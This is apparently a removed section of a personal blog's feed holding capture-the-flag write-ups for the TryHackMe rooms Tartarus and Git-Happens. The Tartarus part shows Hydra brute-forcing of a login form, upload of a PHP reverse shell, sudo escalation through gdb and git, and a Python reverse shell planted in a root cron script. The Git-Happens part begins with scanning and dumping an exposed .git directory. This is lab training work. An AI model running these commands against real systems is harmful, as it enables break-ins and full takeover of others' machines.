----------------------------------------------------------------------------
-+ Target IP:          10.10.30.144
-+ Target Hostname:    tartarus
-+ Target Port:        80
-+ Start Time:         2020-09-26 16:31:43 (GMT1)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.18 (Ubuntu)
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
-+ No CGI Directories found (use '-C all' to force check all possible dirs)
-+ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.
-+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5a9b87b015a4a, mtime: gzip
-+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
-+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
-+ OSVDB-3233: /icons/README: Apache default file found.
-+ 7686 requests: 0 error(s) and 8 item(s) reported on remote host
-+ End Time:           2020-09-26 16:35:39 (GMT1) (236 seconds)
----------------------------------------------------------------------------
-+ 1 host(s) tested
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nikto was able to find robots.txt with one entry.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/robots.png&quot; alt=&quot;robots&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Great now I have the admin directory and a potential username ‘d4rckh’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/admin-dir.png&quot; alt=&quot;admin-dir&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Checking out the admin-dir I found to files credentials.txt and userid. I download each to my machine.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;userid - Is a list of random usernames&lt;/li&gt;
-  &lt;li&gt;credentials.txt - Is a list of common passwords&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;We could use these to brute force SSH but first I will look at the directory ‘/sUp3r-s3cr3t/’ found on the FTP service.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I bet the username/password lists we found are to be used here, I tried to login with admin/admin.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;But I get the error ‘Incorrect username!’. Its highlighting the username is wrong, not the username or password is wrong. I can use this error message along with the userid file to find the correct username(s).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $hydra -L userid -p &quot;test&quot; tartarus http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!&quot;
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 16:53:45
-[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
-[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
-[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!
-[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: test
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 16:53:55
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I used hydra to test each of the usernames to see which were failed.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;-L - username file&lt;/li&gt;
-  &lt;li&gt;-p - I used “test” as a place holder password for now&lt;/li&gt;
-  &lt;li&gt;tartarus - The target&lt;/li&gt;
-  &lt;li&gt;http-post-form - Perform a POST request&lt;/li&gt;
-  &lt;li&gt;/sUp3r-s3cr3t/authenticate.php: - Is the directory/webpage to target&lt;/li&gt;
-  &lt;li&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login: - These are the values the webpage is expecting, ^^ tell Hydra what to populate in those fields.&lt;/li&gt;
-  &lt;li&gt;Incorrect username! - Tells hydra what a failed message will include&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;We have a username, I repeated the process but this time to check for the password.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $hydra -l &amp;lt;HIDDEN&amp;gt; -P credentials.txt 10.10.30.144 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!&quot;
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 17:02:23
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
-[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!
-[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: &amp;lt;HIDDEN&amp;gt;
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 17:02:24
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;All I need to change was the error message, the username and password flags and values. Now with the username and password I will try and log in.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;It worked and now im presented with a upload page, first thing that comes to mind is a PHP reverse shell. First I will gobuster for other directories.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $gobuster dir -u http://tartarus/sUp3r-s3cr3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://tartarus/sUp3r-s3cr3t
-[+] Threads:        10
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/09/26 17:12:07 Starting gobuster
-===============================================================
-/images (Status: 301)
-===============================================================
-2020/09/26 17:20:54 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Inside images is a folder called uploads, this is what I needed. Now I know where my shell will be uploaded.&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;First I copy a php reverse shell script from my webshells directory found on both ParrotOS and Kali and rename it to shell.php.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
-┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $mv php-reverse-shell.php shell.php
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Editing the script I will keep port as 1234 for now and change the IP to point to my VPN IP.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;set_time_limit (0);
-$VERSION = &quot;1.0&quot;;
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I start my netcat listener ready for my shell (hopefully).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $nc -nvlp 1234
-listening on [any] 1234 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/uploaded.png&quot; alt=&quot;uploaded&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;File uploaded.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;As expected the shell.php script was uploaded to /images/uploads/&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $nc -nvlp 1234
-listening on [any] 1234 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 52738
-Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 16:18:28 up  1:10,  0 users,  load average: 0.10, 0.05, 0.01
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now we have a shell I will go hunting for the user flag.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cd /home
-$ ls
-cleanup
-d4rckh
-thirtytwo
-$ cd d4rckh
-$ ls
-cleanup.py
-user.txt
-$ cat user.txt
-0f7dbb2243e692e&amp;lt;HIDDEN&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ive redacted half the flag. Now its time to get root!&lt;/p&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;First I upgrade my shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;In d4rckh home directory is a python script cleanup.py. Even as www-data you can edit that file and use it to get a reverse shell as root. However I don’t believe this is the indented path just yet, first we need to become the d4rckh user.&lt;/p&gt;
-
-&lt;p&gt;When I first get a shell on machine I always run ‘sudo -l’ to check for a quick win.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
-Matching Defaults entries for www-data on ubuntu-xenial:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on ubuntu-xenial:
-    (thirtytwo) NOPASSWD: /var/www/gdb
-www-data@ubuntu-xenial:/home/d4rckh$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Im not disappointed, we can run the command gdb as the user thirtytwo. A quick look on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/gdb/#sudo&quot;&gt;GTFObins&lt;/a&gt; shows I can use gdb to priv esc to the thirtytwo user.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
-GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
-Copyright (C) 2016 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
-and &quot;show warranty&quot; for details.
-This GDB was configured as &quot;x86_64-linux-gnu&quot;.
-Type &quot;show configuration&quot; for configuration details.
-For bug reporting instructions, please see:
-&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
-Find the GDB manual and other documentation resources online at:
-&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
-For help, type &quot;help&quot;.
-Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
-$ 
-$ id
-uid=1004(thirtytwo) gid=1004(thirtytwo) groups=1004(thirtytwo)
-$ cd /home/thirtytwo
-$ ls
-note.txt
-$ cat note.txt
-Hey 32, the other day you were unable to clone my github repository.
-Now you can use git. Took a while to fix it but now its good :)
-
-~D4rckh
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now has user thirtytwo I navigate to the home directory and find a note from D4rckh. So again I checked ‘sudo -l’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for thirtytwo on ubuntu-xenial:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User thirtytwo may run the following commands on ubuntu-xenial:
-    (d4rckh) NOPASSWD: /usr/bin/git
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Following the same processes before, I checked GTFO bins and found a a priv esc path using git.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -u d4rckh /usr/bin/git -p help config
-GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)
-
-NAME
-       git-config - Get and set repository or global options
-
-SYNOPSIS
-       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] name [value [value_regex]]
-       git config [&amp;lt;file-option&amp;gt;] [type] --add name value
-       git config [&amp;lt;file-option&amp;gt;] [type] --replace-all name value [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get name [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-all name [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-urlmatch name URL
-       git config [&amp;lt;file-option&amp;gt;] --unset name [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] --unset-all name [value_regex]
-       git config [&amp;lt;file-option&amp;gt;] --rename-section old_name new_name
-       git config [&amp;lt;file-option&amp;gt;] --remove-section name
-       git config [&amp;lt;file-option&amp;gt;] [-z|--null] [--name-only] -l | --list
-       git config [&amp;lt;file-option&amp;gt;] --get-color name [default]
-       git config [&amp;lt;file-option&amp;gt;] --get-colorbool name [stdout-is-tty]
-       git config [&amp;lt;file-option&amp;gt;] -e | --edit
-!/bin/bash
-d4rckh@ubuntu-xenial:~$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I’m the user d4rckh I can go back to the users home directory and look at the cleanup.up script.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
-# -*- coding: utf-8 -*-
-#!/usr/bin/env python
-import os
-import sys
-try:
-        os.system('rm -r /home/cleanup/* ')
-except:
-        sys.exit()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Reading the script it looks like something that would be ran via cronjob. Lets see what jobs are on the machine.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-# m h dom mon dow user  command
-*/2 *   * * *   root    python /home/d4rckh/cleanup.py
-17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
-#
-d4rckh@ubuntu-xenial:/home/d4rckh$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Perfect, so that script is being run by root. Lets modify to provide us with another reverses shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $nc -nvlp 8080
-listening on [any] 8080 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;First start another netcat listener.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
-# -*- coding: utf-8 -*-
-#!/usr/bin/env python
-
-import socket,subprocess,os
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect((&quot;&amp;lt;HIDDEN&amp;gt;&quot;,8080))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I grabbed the python reverse shell from &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt; and replaced the code in the script. Now I just need to wait for the reverse shell.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
-└──╼ $nc -nvlp 8080
-listening on [any] 8080 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 33596
-/bin/sh: 0: can't access tty; job control turned off
-# whoami
-root
-# cd /root/
-# cat root.txt
-7e055812184a5fa&amp;lt;HIDDEN&amp;gt;
-# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Root dance!&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
-
-      
-      
-      
-      
-      
-
-      <author>
-          <name>Darryn</name>
-        
-        
-      </author>
-
-      
-
-      
-        <category term="tryhackme" />
-      
-        <category term="ctf" />
-      
-        <category term="easy" />
-      
-
-      
-        <summary type="html"></summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">Git-Happens Write Up</title>
-      <link href="https://darrynbrownfield.co.uk/githappens" rel="alternate" type="text/html" title="Git-Happens Write Up" />
-      <published>2020-09-12T00:00:00+00:00</published>
-      <updated>2020-09-12T00:00:00+00:00</updated>
-      <id>https://darrynbrownfield.co.uk/githappens</id>
-      <content type="html" xml:base="https://darrynbrownfield.co.uk/githappens">&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/cover.png&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;Git-Happens is an easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; with the description:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Boss wanted me to create a prototype, so here it is! We even used something called “version control” that made deploying this really easy!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;We only have 1 task, find the super secret password.&lt;/p&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is ‘10.10.39.144’. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.39.144
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 13:07 BST
-Nmap scan report for 10.10.39.144
-Host is up (0.025s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    nginx 1.14.0 (Ubuntu)
-| http-git: 
-|   10.10.39.144:80/.git/
-|     Git repository found!
-|_    Repository description: Unnamed repository; edit this file 'description' to name the...
-|_http-server-header: nginx/1.14.0 (Ubuntu)
-|_http-title: Super Awesome Site!
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The only port is HTTP, I browsed to the machine and found what appears to be a login page but nothing happened when I tried to log in.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/WebPage.png&quot; alt=&quot;WebPage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I continued with some basic web enumeration by running Gobuster but didnt find anything.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $gobuster dir -u http://10.10.39.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-===============================================================
-Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.39.144
-[+] Threads:        50
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
-2020/09/12 13:15:14 Starting gobuster
-===============================================================
-/css (Status: 301)
-===============================================================
-2020/09/12 13:17:12 Finished
-===============================================================
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However nmap did find /.git/ so I looked at that next.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/githappens/GitPage.png&quot; alt=&quot;GitPage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I tried to run git clone to download the files from the server but had no joy.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/' not found
-┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/.git
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/.git/' not found
-┌─[✗]─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $git clone http://10.10.39.144/.git/
-Cloning into '10.10.39.144'...
-fatal: repository 'http://10.10.39.144/.git/' not found
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I did find some tools to dump the git files. However, I used wget using the -r flag to download the files.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]                                                                                                                             
-└──╼ $wget -r http://10.10.39.144/.git/                                                                                                                                       
---2020-09-12 13:23:22--  http://10.10.39.144/.git/                                                                                                                            
-Connecting to 10.10.39.144:80... connected.                                                                                                                                   
-HTTP request sent, awaiting response... 200 OK                                                                                                                                
-Length: unspecified [text/html]                                                                                                                                               
-Saving to: ‘10.10.39.144/.git/index.html’                                                                                                                                     
-                                                                                                                                                                              
-10.10.39.144/.git/index.html                     [ &amp;lt;=&amp;gt;                                                                                           ]   1.36K  --.-KB/s    in 0s 
-
-2020-09-12 13:23:22 (146 MB/s) - ‘10.10.39.144/.git/index.html’ saved [1391]
-
-Loading robots.txt; please ignore errors.
---2020-09-12 13:23:22--  http://10.10.39.144/robots.txt
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 404 Not Found
-2020-09-12 13:23:22 ERROR 404: Not Found.
-
---2020-09-12 13:23:22--  http://10.10.39.144/ 
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 200 OK
-Length: 6890 (6.7K) [text/html]
-Saving to: ‘10.10.39.144/index.html’
-
-10.10.39.144/index.html                      100%[==============================================================================================&amp;gt;]   6.73K  --.-KB/s    in 0s 
-
-2020-09-12 13:23:22 (16.1 MB/s) - ‘10.10.39.144/index.html’ saved [6890/6890]
-
---2020-09-12 13:23:22--  http://10.10.39.144/.git/branches/
-Reusing existing connection to 10.10.39.144:80.
-HTTP request sent, awaiting response... 200 OK
-Length: unspecified [text/html]
-Saving to: ‘10.10.39.144/.git/branches/index.html’
-
-&amp;lt;&amp;lt;SNIP&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Now I had all the files, I took a look through but nothing jumped out as a super secret password so did some research on the git commands to see how I could use the files.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $ls
-10.10.39.144  nmap
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens]
-└──╼ $cd 10.10.39.144/
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $ls -lah
-total 8.0K
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 .
-drwxr-xr-x 1 daz daz   32 Sep 12 13:23 ..
-drwxr-xr-x 1 daz daz   18 Sep 12 13:23 css
-drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .git
--rw-r--r-- 1 daz daz 6.8K Jul 23 23:39 index.html
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $ls -lah .git
-total 24K
-drwxr-xr-x 1 daz daz  158 Sep 12 13:23 .
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 ..
-drwxr-xr-x 1 daz daz   20 Sep 12 13:23 branches
--rw-r--r-- 1 daz daz  110 Jul 24 07:25 config
--rw-r--r-- 1 daz daz   73 Jul 23 23:39 description
--rw-r--r-- 1 daz daz   23 Jul 23 23:39 HEAD
-drwxr-xr-x 1 daz daz  434 Sep 12 13:23 hooks
--rw-r--r-- 1 daz daz  645 Jul 23 23:39 index
--rw-r--r-- 1 daz daz 1.4K Sep 12 13:23 index.html
-drwxr-xr-x 1 daz daz   34 Sep 12 13:23 info
-drwxr-xr-x 1 daz daz   36 Sep 12 13:23 logs
-drwxr-xr-x 1 daz daz  164 Sep 12 13:23 objects
--rw-r--r-- 1 daz daz  102 Jul 24 07:25 packed-refs
-drwxr-xr-x 1 daz daz   52 Sep 12 13:23 refs
-┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]
-└──╼ $
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Running git without any flags shows the help output and some of available commands.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/GitHappens/10.10.39.144]                     
-└──╼ $git                                                                          
-usage: git [--version] [--help] [-C &amp;lt;path&amp;gt;] [-c &amp;lt;name&amp;gt;=&amp;lt;value&amp;gt;]                    
-           [--exec-path[=&amp;lt;path&amp;gt;]] [--html-path] [--man-path] [--info-path]         
-           [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare]     
-           [--git-dir=&amp;lt;path&amp;gt;] [--work-tree=&amp;lt;path&amp;gt;] [--namespace=&amp;lt;name&amp;gt;]            
-           &amp;lt;command&amp;gt; [&amp;lt;args&amp;gt;]                                                      
-                                                                                   
-These are common Git commands used in various situations:                          
-                                                                                   
-start a working area (see also: git help tutorial)
-   clone             Clone a repository into a new directory
-   init              Create an empty Git repository or reinitialize an existing one
-
-work on the current change (see also: git help everyday)
-   add               Add file contents to the index
-   mv                Move or rename a file, a directory, or a symlink
-   restore           Restore working tree files
-   rm                Remove files from the working tree and from the index
-   sparse-checkout   Initialize and modify the sparse-checkout
-
-examine the history and state (see also: git help revisions)
-   bisect            Use binary search to find the commit that introduced a bug
-   diff              Show changes between commits, commit and working tree, etc
-   grep              Print lines matching a pattern
-   log               Show commit logs
-   show              Show various types of objects
-   status            Show the working tree status
-
-grow, mark and tweak your common history
-   branch            List, create, or delete branches
-   commit            Record changes to the repository
-   merge             Join two or more development histories together
-   rebase            Reapply commits on top of another base tip
-   reset             Reset current HEAD to the specified state
-   switch            Switch branches
-   tag               Create, list, delete or verify a tag object signed with GPG
-
-collaborate (see also: git help workflows)
-   fetch             Download objects and refs from another repository
-   pull              Fetch from and integrate with another repository or a local branch
-   push              Update remote refs along with associated objects
-
-'git help -a' and 'git help -g' list available subcommands and some
